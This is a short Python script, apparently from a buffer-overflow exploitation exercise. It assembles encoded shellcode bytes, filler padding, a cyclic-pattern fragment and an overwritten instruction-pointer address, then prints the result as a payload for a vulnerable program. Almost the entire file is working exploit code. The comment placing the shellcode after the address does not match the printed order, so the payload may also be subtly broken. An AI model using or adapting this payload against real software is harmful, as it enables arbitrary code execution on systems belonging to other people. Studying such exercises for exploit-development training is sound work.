#!/usr/bin/python 

# This will be used in place of padding2 in the earlier script
buf =  b""
buf += b"\xbf\x7c\x31\xe2\x16\xda\xd0\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x16\x31\x78\x13\x83\xc0\x04\x03\x78\x73\xd3"
buf += b"\x17\x27\x50\xe4\x3b\x1b\x25\x58\xd6\x9e\x20\xbf\x96"
buf += b"\xf9\xff\xc0\x8c\x5b\xad\xa8\x30\x64\x40\x75\x5f\x74"
buf += b"\x33\xd5\x16\x95\xd9\xb3\x70\x9b\x9d\xb5\xc0\x27\x2e"
buf += b"\xc1\x72\x41\x9d\x4a\x31\x3e\x7b\x86\x36\xad\xda\x72"
buf += b"\x08\x8a\x11\x02\x3f\x53\x51\x6b\xef\x8c\xd2\x04\x87"
buf += b"\xfd\x76\xbc\x39\x8b\x95\x6e\x95\x02\xb8\x3f\x12\xd8"
buf += b"\xba\x71\xfe\x88\xbb\x29\xcd\xcd"
prefix = 'A' * (1000 - 112)
padding1 = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1'
#eip = '\x41\x42\x43\x44' #Replace with the actual eip found earlier

# Previously this was ABCD, now we replaced it with the address we actually want the eip register to land at
eip = '\xD0\xAA\xFF\xFF'

#padding2 = 'X' * 250 # This is where msfvenom payload uses the stack at. Hence we keep this area reserved for the shellcode stack operation

      
# We place the buffer right after the eip. Previously this was padding2
print buf + prefix + padding1 + eip
